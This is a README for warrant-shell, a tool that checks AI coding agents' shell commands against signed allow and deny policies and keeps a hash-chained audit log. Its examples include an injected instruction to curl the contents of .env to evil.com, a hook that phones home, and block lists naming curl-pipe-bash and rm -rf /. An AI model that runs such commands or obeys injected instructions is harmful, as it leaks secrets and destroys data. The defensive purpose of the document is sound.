<p align="center">
  <img src="docs/logo.jpg" alt="Warrant" width="120">
</p>

<h1 align="center">warrant-shell (wsh)</h1>

<p align="center">
  Signed capability policies for AI shell agents.<br>
  Control what your tools can execute — cryptographically.
</p>

<p align="center">
  <strong>⚠️ Alpha</strong> — warrant-shell is currently in alpha.
  <br>
  <strong>Planned Beta:</strong> migrate from the current custom policy engine to Cedar-based policy evaluation.
  <a href="https://github.com/warrant-sh/warrant-shell/issues">We'd love to hear from you.</a>
</p>

## What is this?

`wsh` is a command-execution wrapper that checks every shell command against a signed, human-readable policy (a "warrant") before running it. Think of it as sudo-in-reverse for AI agents.

**It is not a sandbox.** For hard containment, use Docker, Firejail, or Landlock. `wsh` controls _what_ an agent is authorised to do and provides a signed audit trail. It complements sandboxes — it doesn't replace them.

**Design principle:** wsh enforces policy defined in TOML files. Nothing is hardcoded. Tool and policy packs are manifest-driven (`wsh add <name>`). If a command is in the signed warrant's allow list, it runs. If it's not, it doesn't. No exceptions, no overrides, no paternalism.

## Quick Start

```bash
# Install with audit daemon (recommended)
curl -fsSL https://warrant.sh/install.sh | sudo sh

# Hardened socket mode (group-restricted instead of world-writable socket)
curl -fsSL https://warrant.sh/install.sh | sudo sh -s -- --group-socket-access

# Set up for your agent:
wsh setup codex
# or:
wsh setup claude
```

`wsh setup` walks you through:

1. **Installs manifests** — `coreutils`, `git`, `npm`, `pip`, agent manifest (`codex` or `claude`), `dangerous-patterns`, `sanitize-env`
2. **Locks the policy** — compiles, signs, and installs the warrant
3. **Picks your agents** — choose which to wrap (Codex, Claude Code, OpenCode)
4. **Installs the guard** — adds a shell hook so every command your agent runs is policy-checked

After setup, just use your agent normally:

```bash
codex                             # every command is now policy-enforced
claude                            # same — transparent to the agent
```

Commands not in the policy are denied before they execute. The agent sees the denial and adapts.

### Manual setup

```bash
# Or build your policy manually:
wsh init                          # install baseline policy bundle
wsh add git                       # add tool-specific drafts
wsh add cargo
sudo wsh lock                     # compile, sign, install
wsh exec -- cargo build           # enforced

# Project policy (per-repo, team-shared)
cd ~/Work/my-project
wsh add git --scope project       # writes .warrant/drafts/git.toml
sudo wsh lock                     # compiles system+project drafts
wsh exec -- cargo build           # enforced under project policy

# Named profiles (per-agent on shared machines)
wsh --profile codex exec -- cargo build
```

## Onboarding & `wsh.toml`

### `wsh init`

Run `wsh init` to bootstrap the default baseline policy bundle.

`wsh init` is non-interactive and always installs:
- `warrant-sh/coreutils`
- `warrant-sh/sanitize-env`
- `warrant-sh/dangerous-patterns`

It also writes a `wsh.toml` config recording selected manifests.

### `wsh.toml` config

`wsh.toml` is a shareable manifest list. When a new developer clones a repo and runs `wsh init`, all listed manifests are automatically added as drafts — no need to `wsh add` each one individually.

```toml
[config]
schema = "warrant.config.v1"
command_default = "deny"

manifests = [
  "warrant-sh/git",
  "warrant-sh/cargo",
  "warrant-sh/sanitize-env",
  "warrant-sh/dangerous-patterns",
]
```

**Locations:**

| Location | Scope | Purpose |
|----------|-------|---------|
| `~/.config/wsh/wsh.toml` | System | Personal defaults (created by `wsh init`) |
| `./wsh.toml` | Project | Committed to version control for team sharing |
| `./.warrant/wsh.toml` | Project | Alternative project location |

**How it works:**

- `wsh init` checks for an existing `wsh.toml` first. If found, it creates drafts for every listed manifest (scope inferred from the config location). If not found, it installs the baseline manifests and writes `~/.config/wsh/wsh.toml`.
- `wsh add <name...>` appends resolved manifest IDs to the active `wsh.toml` after creating drafts, keeping the config in sync.
- Manifest entries use full IDs (`warrant-sh/git`, `warrant-sh/cargo`). Bare names like `git` work as shorthand for `warrant-sh/git`.
- `wsh init`, `wsh setup`, and `wsh add` auto-pull missing manifests from the registry when needed. Use `wsh pull` when you want an explicit manual refresh.
- `command_default` controls command posture for future locks: `"deny"` (default) or `"allow"`.

### Default command mode

`wsh` supports two command-default postures:

- `deny` (default): commands not explicitly allowlisted are denied
- `allow`: commands not explicitly allowlisted are permitted unless blocked by explicit deny controls

Set the global default used for future locks:

```bash
wsh set-default deny
wsh set-default allow
```

Apply immediately:

```bash
sudo wsh set-default allow --apply
# or
wsh set-default allow
sudo wsh lock
```

Note: this is a global config setting (`~/.config/wsh/wsh.toml`) that affects newly locked warrants.

**Team workflow:**

```bash
# Maintainer sets up project policy
cd ~/Work/my-project
cat > wsh.toml << 'EOF'
[config]
schema = "warrant.config.v1"
command_default = "deny"

manifests = [
  "warrant-sh/git",
  "warrant-sh/cargo",
  "warrant-sh/sanitize-env",
  "warrant-sh/dangerous-patterns",
]
EOF
git add wsh.toml && git commit -m "Add warrant config"

# New developer clones and runs init
git clone ... && cd my-project
wsh init                          # reads wsh.toml, creates all drafts
wsh edit git --scope project      # review/customize
sudo wsh lock                     # sign and install
```

## Why use wsh? Real-world examples

Docker stops the agent escaping. wsh controls what it does *inside*.

**🗑️ "It deleted my test database"**
Your coding agent is fixing a flaky test. It decides to `rm -rf ./data` to start fresh — but `./data` is a symlink to your mounted Postgres volume. With wsh: `files.delete` only allows `/tmp/**`. Denied. Database intact.

**🚀 "It force-pushed to main"**
Agent finishes a feature branch and helpfully runs `git push --force origin main` to "clean up". Your production branch is now whatever the agent last committed. With wsh: `git.push_force = false`. Denied.

**📡 "It curled our secrets to a random URL"**
A prompt injection in a GitHub issue tells the agent to `curl -X POST https://evil.com/collect -d "$(cat .env)"`. The container has network access (the agent needs to pull dependencies). With wsh: `network.hosts` only allows `github.com` and `crates.io`. Denied. Secrets stay put.

**📦 "It added a malicious dependency"**
Agent runs `npm install totally-legit-package` which is actually typosquatting a popular package. With wsh: the `npm` manifest includes a denylist of 8,800+ known-malicious packages (Datadog's malicious-software-packages-dataset). The install is denied before it even starts. Use `wsh package-check npm package-name` to check any package manually.

**🔧 "It modified .git/hooks without asking"**
Agent writes a pre-commit hook that phones home on every future commit. With wsh: `files.write` only allows the project's `/workspace/src/**`. Writing to `.git/hooks` is outside the allowed paths. Denied.

**📋 "We had no idea what it actually did"**
Agent ran 847 commands over a 3-hour session. Something broke, but nobody knows when or why. With wsh: every command logged with timestamp, decision, policy hash, and session ID. `wsh audit --json | jq 'select(.decision == "deny")'` shows you exactly what it tried and failed to do.

**The pattern:** Docker prevents the agent from reaching your host. wsh prevents it from doing damage *to the project it's working on*.

## How it works

1. **Define** a policy (the "warrant") listing what commands, files, network hosts, and git operations are allowed
2. **Sign** the policy with `wsh lock` — creates a cryptographic signature so it can't be tampered with
3. **Wrap** your agent's commands with `wsh exec --` — every command is checked against the signed policy before execution
4. **Audit** every decision — a privileged audit daemon (`wsh-auditd`) receives events via Unix socket, authenticates the caller via peer credentials, and appends to a SHA-256 hash-chained ledger. Tamper-evident, fail-closed, and verifiable with `wsh audit-verify`

### Shell Guard — What Gets Logged

When the shell guard is active, **every external command** is evaluated against the warrant and logged (allow or deny). However, shell builtins that execute inside the shell process — `cd`, `echo`, `export`, `set`, `pwd`, `true`, `[`, etc. — are **skipped**. They never spawn an external binary, so there is nothing for wsh to intercept, and logging them would create enormous noise with no security value.

Three builtins that *could* be dangerous are **not skipped** and are fully evaluated and logged:

- **`eval`** — executes arbitrary strings as code; a classic evasion vector
- **`exec`** — replaces the current shell process, bypassing further guard checks
- **`source`** (and `.`) — runs arbitrary script files in the current shell context

If you see mostly denials in `wsh audit`, that's normal — it means the agent is running lots of harmless builtins (which are skipped) and the external commands it attempts are being caught by policy.

### Package Security Layer

Package managers (npm, pip, cargo) can install malicious or compromised packages. wsh includes three modes to control this:

- **open** (default) — no package-level checks
- **denylist** — block known-malicious packages from [Datadog's malicious-software-packages-dataset](https://github.com/DataDog/malicious-software-packages-dataset) (8,800+ npm, 1,700+ PyPI entries, updated regularly)
- **allowlist** — only allow installation of approved packages (via scoped grants)

The `npm`, `pip`, and `cargo` manifests default to denylist mode. Check any package with `wsh package-check npm package-name`.

## Capability Domains

The warrant controls access across these domains:

| Domain | What it controls |
|--------|-----------------|
| `commands` | Which programs can run (allowlist + blocklist patterns), plus optional resolved binary path scopes (`commands.paths`) |
| `files.read` | Which paths can be read (glob patterns) |
| `files.write` | Which paths can be written or created |
| `files.delete` | Which paths can be removed |
| `network` | Whether curl/wget are allowed, and to which hosts |
| `git` | Push, force-push, and branch restrictions |
| `process` | Background processes and signal sending |
| `environment` | Optional env var stripping before exec (`environment.strip`) |

### Example warrant

```toml
[warrant]
version = 1
tool = "warrant-shell"

[capabilities.commands]
allow = [
    "git", "cargo", "rustc",
    "cat", "ls", "grep", "find",
    "mkdir", "cp", "mv", "touch",
]
block = [
    "rm -rf /", "rm -rf /*",
    "curl * | bash", "wget * | bash",
]
paths = ["/usr/bin/**", "/bin/**", "/usr/local/bin/**"]

[capabilities.files]
read  = { allow = true, paths = ["/home/user/project/**", "/tmp/**"] }
write = { allow = true, paths = ["/home/user/project/**", "/tmp/**"] }
delete = { allow = true, paths = ["/tmp/**"] }

[capabilities.network]
allow = false

[capabilities.git]
push = true
push_force = false

[capabilities.environment]
strip = ["LD_PRELOAD", "BASH_ENV", "RUSTC_WRAPPER", "GIT_SSH_COMMAND"]
```

## Interpreters: Deny by Default

Interpreters (`python`, `node`, `ruby`, `perl`) are **denied by default** — you don't need to do anything to block them. Each interpreter you add opens another attack vector: an agent with Python access can use the standard library to read files, make network requests, and spawn processes that bypass wsh entirely.

Add only what your workflow requires:

```bash
# Full ecosystem bundle:
wsh setup python            # includes python + pip + uv manifests
wsh setup node              # includes node + npm manifests
wsh setup rust              # includes rust + cargo manifests

# Fine-grained manifest control:
wsh add python pip uv       # choose individual manifests
wsh add node npm
wsh add rust cargo
sudo wsh lock               # seal the updated policy
```
Bundles are registry-defined collections of manifests. `wsh add` creates drafts for each named manifest (or bundle fallback) so you can compose the exact policy set you want.

## Global Guard (Dedicated Agent Machines)

By default, the guard hook only checks commands from your agent — normal shell sessions bypass the policy. This is developer-friendly: minimal friction on your main machine.

For dedicated agent machines (where the agent owns the box), enable global guard:

```bash
wsh setup codex
wsh guard --all              # guard all shell sessions
```

This adds `export WSH_GUARD=1` to `~/.zshenv`, so *every* shell command — yours, the agent's, cron jobs — goes through policy checks. Use `wsh elevate` for temporary unrestricted access (password-protected, default 30 min timeout).

Check or disable at any time:

```bash
wsh guard                    # show current status
wsh guard --off              # disable global guard
```

## Policy Packs

Policy packs are manifests, so they use the same `wsh add` flow as tools:

- `wsh add dangerous-patterns` to block destructive command patterns (`rm -rf /`, `curl | bash`, `chmod -R 777 /`, etc.)
- `wsh add strict-paths` to restrict resolved executable paths to system locations
- `wsh add sanitize-env` to strip high-risk environment variables before execution

This keeps policy onboarding in one model: manifest -> draft -> lock.

## Registry

Manifests are hosted in the [warrant-sh/registry](https://github.com/warrant-sh/registry) on GitHub. `wsh init`, `wsh setup`, and `wsh add` auto-fetch missing manifests; you can also refresh manually:

```bash
wsh pull                          # fetch/update all manifests
wsh pull git                      # fetch a specific manifest
```

Manifests use the `warrant-sh/` namespace. Community and enterprise manifests can use their own namespaces.

## Subcommands

| Command | Description |
|---------|-------------|
| `wsh setup <agent>` | Set up warrant for a specific agent (`codex`, `claude`); pulls missing manifests automatically |
| `wsh init` | Install baseline policy bundle (`coreutils` + `sanitize-env` + `dangerous-patterns`). No prompts. |
| `wsh set-default <deny\|allow> [--apply]` | Set global command default mode for future locks; `--apply` runs lock immediately (requires root) |
| `wsh add <name...> [--scope system|project]` | Add one or more manifests (`system` default, `project` writes `.warrant/drafts/`); each name resolves as manifest first, then bundle |
| `wsh edit <tool> [--scope system|project]` | Edit an existing draft in your editor |
| `wsh search <query>` | Search available manifests |
| `wsh pull [tool]` | Fetch manifests from registry (all if no tool specified) |
| `sudo wsh update` | Update `wsh` + `wsh-auditd` from official prebuilt binaries, restart daemon, and run an audit health check |
| `wsh update --check` | Run update health checks only (no install/restart) |
| `sudo wsh uninstall --yes` | Completely remove `wsh`, `wsh-auditd`, and privileged state/config to reset the machine |
| `wsh lock` | Sign and install the warrant (system/profile mode) |
| `wsh policy [all|list|<tool>]` | Show locked policy entries (`all`), locked manifest IDs (`list`), or entries for one tool |
| `wsh exec -- <cmd>` | Check the warrant, then execute if allowed |
| `wsh check <cmd>` | Dry-run: check if a command would be allowed |
| `wsh explain <cmd>` | Show matched manifest capability rules, then run a policy check |
| `wsh test-policy [tool]` | Compile and validate drafts without writing/installing a lock |
| `wsh status` | Show installed warrant metadata |
| `wsh audit` | View the audit trail |
| `wsh audit-verify` | Validate hash chain integrity of the audit ledger |
| `wsh guard --all` | Enable global guard: all shell sessions are policy-checked (recommended for dedicated agent machines) |
| `wsh guard --off` | Disable global guard: only agent-spawned sessions are guarded |
| `wsh guard` | Show current guard status |
| `wsh elevate` | Temporarily bypass restrictions (default 30 min) |
| `wsh de-elevate` | End elevation session |
| `wsh is-elevated` | Check elevation status |
| `wsh profiles` | List installed default/profile warrants |
| `wsh projects` | List locked project directories |

Global flags:
- `--profile <name>`: use `/etc/warrant-shell/profiles/<name>/` instead of the default `/etc/warrant-shell/`

## Project-Level Warrants (`.warrant/`)

Project maintainers define agent policies in version-controlled `.warrant/drafts/*.toml` files. Signing still uses system keys, so agents can read drafts but cannot forge signed policy.

### Setup

```bash
cd ~/Work/my-project
wsh add git --scope project
wsh add cargo --scope project
vim .warrant/drafts/git.toml

sudo wsh lock               # compiles system + project drafts, signs, binds this directory
```

### How it works

1. `~/.config/wsh/drafts/*.toml` defines the system baseline.
2. `.warrant/drafts/*.toml` optionally adds project constraints.
3. `sudo wsh lock` in a repo with `.warrant/drafts/` compiles both; project drafts may tighten but never loosen system policy.
4. The resulting signed warrant is bound to the directory via `projects.json`, and `wsh exec`/`wsh check` auto-discover it there.

### Day-to-day use

```bash
wsh exec -- cargo build     # enforced under project policy
wsh exec -- curl evil.com   # denied

# Update the policy
vim .warrant/drafts/git.toml
sudo wsh lock               # re-signs (version N → N+1)

# List locked projects
wsh projects
```

### Resolution order

1. `--paths-root` (explicit test/override path)
2. Locked project for current directory (via `projects.json` registry)
3. `--profile <name>`
4. System default (`/etc/warrant-shell/`)

If `.warrant/drafts/` exists but the project is not locked, wsh prints:
`note: found .warrant/drafts but project is not locked. Run: sudo wsh lock`

## Profiles

Use named profiles when multiple agents share one machine but need different warrants.

```bash
# Default profile (existing behavior)
wsh exec -- cargo build

# Named profiles
wsh --profile codex exec -- cargo build
wsh --profile bertie exec -- gog gmail

# List installed profiles
wsh profiles
```

On Linux, profile warrants are stored under:

```text
/etc/warrant-shell/warrant.toml                   # default
/etc/warrant-shell/profiles/codex/warrant.toml    # codex
/etc/warrant-shell/profiles/bertie/warrant.toml   # bertie
```

Use `wsh --profile <name> lock` to compile drafts and install a named profile warrant.

## What wsh catches

- ✅ Unauthorised commands (`ssh`, `nc`, `dd` — anything not in the allowlist)
- ✅ Dangerous patterns (`rm -rf /`, `curl | bash`, `chmod -R 777 /`)
- ✅ File access outside allowed paths
- ✅ Network access when disallowed
- ✅ Git force-push when restricted
- ✅ Piped and chained commands (each segment checked)
- ✅ Redirections to unauthorised paths (`echo "data" > /etc/config`)
- ✅ Optional policy-defined env stripping (`capabilities.environment.strip`)

## What wsh does NOT do

**wsh is a policy gate, not a sandbox.** Be aware of these limitations:

- **Interpreter escape:** Interpreters are denied by default, but if you add one (e.g. `wsh add python`), the agent can use its standard library to bypass file/network restrictions. Each interpreter you grant is like granting `sudo` — it can do anything the interpreter can do. Add only what your project needs.
- **Child processes:** wsh checks the top-level command. It does not intercept child processes spawned by allowed programs.
- **Syscall filtering:** wsh does not use seccomp, Landlock, or namespaces. For kernel-level containment, use a sandbox.

**Recommendation:** For production AI agent deployments, pair wsh with container isolation (Docker, Podman) with AppArmor/seccomp profiles. The container provides the wall; the TOML policy provides the rules.

## Audit Daemon (`wsh-auditd`)

In system mode, audit events are written to a privileged daemon rather than directly to a log file. This solves the fundamental tension between non-root agent execution and tamper-proof audit logging.

**How it works:**

1. `wsh exec`/`wsh check` sends audit events to local daemon endpoints (see below)
2. The daemon authenticates the caller using kernel peer credentials (`SO_PEERCRED` on Linux, `getpeereid()` on macOS)
3. Events are appended to a root-owned daily ledger (`/var/lib/warrant-shell/audit/audit-YYYY-MM-DD.jsonl`)
4. Each entry includes a SHA-256 hash of the previous entry, forming a tamper-evident hash chain
5. If the daemon is not running and `audit_required=true`, commands are denied (fail-closed)

`wsh-auditd` binds three local endpoints (tried in order by `wsh`):

1. `/var/run/warrant-shell/auditd.sock`
2. `/tmp/warrant-shell/auditd.sock` (sandbox-friendly relay socket)
3. `127.0.0.1:45873` (localhost TCP fallback for runtimes that block Unix socket connect)

This keeps `audit_required=true` compatible with sandboxed agent runs while preserving daemon-authenticated audit logging.

**Installation:** The daemon is bootstrapped as a system service by the install script (`systemd` on Linux, `launchd` on macOS). Run the installer with `sudo` for system mode:

```bash
curl -fsSL https://warrant.sh/install.sh | sudo sh

# Hardened mode: daemon socket is group-restricted (0660) instead of public (0666)
curl -fsSL https://warrant.sh/install.sh | sudo sh -s -- --group-socket-access
```

**Socket access modes:**

1. Default install (no extra flags): daemon socket mode is `0666` for frictionless onboarding.
2. `--group-socket-access`: daemon socket mode is `0660`, daemon runs with group `warrant`, and installer attempts to add the invoking user to that group.
3. After `--group-socket-access`, users usually need a new login/session for group membership changes to apply.
4. Installers run a post-setup endpoint probe and print which audit endpoint is active.

**Docker/containers (recommended for hardened deployments):**

1. Build image with a dedicated app user and a shared `warrant` group.
2. Ensure the app user is a member of `warrant`.
3. Install with `--group-socket-access` (or set equivalent service config) so `wsh-auditd` uses socket mode `0660`.
4. Run both the daemon and the agent process in the same container with matching group membership.

Example Dockerfile sketch:

```dockerfile
RUN groupadd -r warrant && useradd -m -g warrant app
# install wsh + daemon
RUN curl -fsSL https://warrant.sh/install.sh | sh -s -- --group-socket-access
USER app
```

**Verification:** Validate the integrity of the audit hash chain at any time:

```bash
wsh audit-verify
```

## Part of the Warrant ecosystem

| Component | What | Security model |
|-----------|------|---------------|
| **[warrant-core](https://github.com/warrant-sh/warrant-core)** | Library for CLI authors | Bulletproof — checks inside the application |
| **warrant-shell** (this repo) | Wrapper for existing CLIs | Guardrail + audit trail |
| **warrant-box** _(planned)_ | Sandboxed environment | Hard containment + granular policy |

`warrant-core` provides the strongest security model — when a CLI integrates the library directly, there's no interpreter escape possible. `wsh` bridges the gap for the thousands of existing tools that haven't integrated warrant-core.

## Integration

### How agent enforcement works

Most AI coding agents (Codex, Claude Code, OpenCode) execute commands by spawning a shell — typically `/bin/zsh -lc 'command'`. They ignore `$SHELL`. This means traditional shell-wrapper approaches don't work.

`wsh setup` solves this with a **shell guard hook**:

1. Aliases set guard env vars: `alias codex='WSH_GUARD=1 BASH_ENV="$HOME/.bashenv" codex'`
2. A hook in `~/.zshenv` / `~/.zshrc` intercepts zsh `-c` commands:
   ```zsh
   if [[ -n "$ZSH_EXECUTION_STRING" && "$WSH_GUARD" != "0" && ( -n "$WSH_GUARD" || "$CLAUDECODE" = "1" ) ]]; then
     wsh guard "$ZSH_EXECUTION_STRING" || exit 1
   fi
   ```
3. A hook in `~/.bashenv` intercepts bash `-c` commands:
   ```bash
   if [[ -n "$BASH_EXECUTION_STRING" && "$WSH_GUARD" != "0" && ( -n "$WSH_GUARD" || "$CLAUDECODE" = "1" ) ]]; then
     wsh guard "$BASH_EXECUTION_STRING" || exit 1
   fi
   ```
4. Codex/OpenCode are covered by shell startup hooks alone (zsh/bash `-c` paths).
5. Claude Code additionally needs a `PreToolUse` hook in `~/.claude/settings.json` that runs `wsh guard` for `Bash` tool calls before execution.
6. `wsh guard` (a Rust subcommand) evaluates the command against policy, skipping shell builtins. If denied, the shell exits before the command runs.

The agent sees a clean error and adapts. Your normal shell sessions are unaffected (no `WSH_GUARD` set).

### Supported agents

| Agent | Method | Notes |
|-------|--------|-------|
| **Codex** | `wsh setup codex` | Shell guard hooks (`.zshenv`/`.zshrc`, `.bashenv`) |
| **Claude Code** | `wsh setup claude` | Shell guard hooks + Claude `PreToolUse` `Bash` hook |
| **OpenCode** | `wsh setup codex` | Uses the same Codex shell hooks (`.zshenv`/`.zshrc`, `.bashenv`) |
| **Custom agents** | `wsh exec -- <command>` | Direct enforcement |

### Direct enforcement

For scripts, CI, or custom integrations:

```bash
wsh exec -- cargo build           # runs if allowed, denied otherwise
wsh check -- curl https://evil.com  # dry-run: prints allow/deny, exit code 0/1
```

### Per-session enforcement

Tag audit entries with a session ID:

```bash
WSH_SESSION_ID="codex-$(date +%s)" codex

# Review what the agent did:
sudo wsh audit --json | jq 'select(.session_id | startswith("codex-"))'
```

### Bash integration

`wsh setup` now writes `~/.bashenv` and adds a loader in `~/.bashrc` and `~/.bash_profile`, so bash login and non-interactive `-c` execution paths are covered.

## Building from source

```bash
git clone https://github.com/warrant-sh/warrant-shell.git
cd warrant-shell
cargo build --release
# dev installer (build + daemon setup)
./scripts/install-dev.sh
# hardened daemon socket mode
./scripts/install-dev.sh --group-socket-access
# daemon-only mode (auto-detects wsh-auditd path from common locations)
sudo ./scripts/install-dev.sh --daemon-only
```

Requires [warrant-core](https://github.com/warrant-sh/warrant-core) as a sibling directory.


- [warrant.sh](https://warrant.sh) — project home
- [warrant-core](https://github.com/warrant-sh/warrant-core) — the library

## License

Licensed under either of [Apache License, Version 2.0](LICENSE-APACHE) or [MIT License](LICENSE), at your option.
